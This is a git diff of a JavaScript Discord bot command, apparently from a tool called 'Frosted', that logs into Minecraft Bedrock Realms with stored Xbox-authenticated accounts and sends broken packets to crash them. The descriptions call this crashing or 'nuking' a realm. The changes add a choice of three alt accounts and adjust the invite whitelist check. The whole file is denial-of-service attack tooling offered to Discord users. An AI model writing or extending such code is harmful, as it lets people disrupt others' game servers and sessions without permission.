@@ -14,12 +14,20 @@ module.exports = {
         .setName("ssbp")
         .setIntegrationTypes(0, 1)
         .setContexts(0, 1, 2)
-        .setDescription("Crash a realm")
+        .setDescription("Send Broken Packets to a Realm :3")
+        .addIntegerOption(option =>
+            option.setName('account')
+                .setDescription('Account you wanna use')
+                .setRequired(true)
+                .addChoices(
+                    { name: 'Account 1', value: 1 },
+                    { name: 'Account 2', value: 2 },
+                    { name: 'Account 3', value: 3 }))
         .addStringOption(option =>
             option.setName('invite')
                 .setDescription('Realm invite code')
                 .setRequired(true)
-                .setMinLength(11)
+                .setMinLength(8)
                 .setMaxLength(15))
         .addIntegerOption(option =>
             option.setName("duration")
@@ -47,7 +55,7 @@ module.exports = {
         const duration = interaction.options.getInteger('duration');
         const mode = interaction.options.getInteger('mode')
         let disconnected = false;
-
+        const account = interaction.options.getInteger('account') 
         try {
             await interaction.reply({
                 embeds: [
@@ -60,7 +68,7 @@ module.exports = {
                 ],ephemeral: true,
             });
 
-            if (!fs.existsSync(`./data/client/frosted/${interaction.user.id}`)) {
+            if (!fs.existsSync(`./data/client/frosted/${interaction.user.id}/profile${account}`)) {
                 await interaction.editReply({
                     embeds: [
                         {
@@ -75,19 +83,18 @@ module.exports = {
             }
 
             const whitelist = JSON.parse(fs.readFileSync('./data/client/whitelist.json', 'utf8'));
-        const isWhitelisted = whitelist.some(entry => entry.realmCode === invite);
-        if (isWhitelisted) {
-            return interaction.editReply({
-                embeds: [
-                    new EmbedBuilder()
-                        .setTitle('Frosted Error')
-                        .setDescription(`The invite \`${invite}\` is in the whitelist and cannot be nuked.`)
-                        .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
-                        .setThumbnail(config.embeds.footerurl)
-                        .setColor(config.embeds.color)
-                ]
-            });
-        }
+            if (whitelist.includes(invite)) {
+                return interaction.editReply({
+                    embeds: [
+                        new EmbedBuilder()
+                            .setTitle('Frosted Error')
+                            .setDescription(`The invite \`${invite}\` is in the whitelist and cannot be nuked.`)
+                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
+                            .setThumbnail(config.embeds.footerurl)
+                            .setColor(config.embeds.color)
+                    ]
+                });
+            }
 
             const realm = await dumprealm(invite);
             if (!realm) {
@@ -109,7 +116,7 @@ module.exports = {
             const keypair = crypto.generateKeyPairSync("ec", { namedCurve: curve }).toString("base64");
             const bot = new Authflow(
                 interaction.user.id, 
-                path.resolve(`./data/client/frosted/${interaction.user.id}`), 
+                path.resolve(`./data/client/frosted/${interaction.user.id}/profile${account}`), 
                 {
                     flow: 'live',
                     authTitle: 'MinecraftNintendoSwitch',
@@ -207,7 +214,7 @@ module.exports = {
 }
 
 const client = createClient({
-    profilesFolder: `./data/client/frosted/${interaction.user.id}`,
+    profilesFolder: `./data/client/frosted/${interaction.user.id}/profile${account}`,
     username: interaction.user.id,
     offline: false,
     realms: {
